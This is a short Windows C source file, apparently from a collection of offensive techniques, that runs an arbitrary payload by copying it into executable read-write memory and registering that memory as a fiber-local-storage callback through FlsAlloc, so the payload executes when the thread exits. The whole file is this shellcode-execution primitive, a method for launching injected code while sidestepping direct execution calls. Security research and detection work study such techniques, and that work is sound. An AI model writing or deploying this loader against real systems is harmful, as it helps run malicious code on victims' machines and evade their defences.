#include "Win32Helper.h"

VOID InvokeFlsAllocCallbackRoutine(LPVOID lpParameter)
{
	DWORD dwIndex = ERROR_SUCCESS;
	
	dwIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)lpParameter);
	if (dwIndex == FLS_OUT_OF_INDEXES)
		return;

	FlsSetValue(dwIndex, (PVOID)"Data");

}

BOOL MpfSceViaFlsAlloc(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeFlsAllocCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}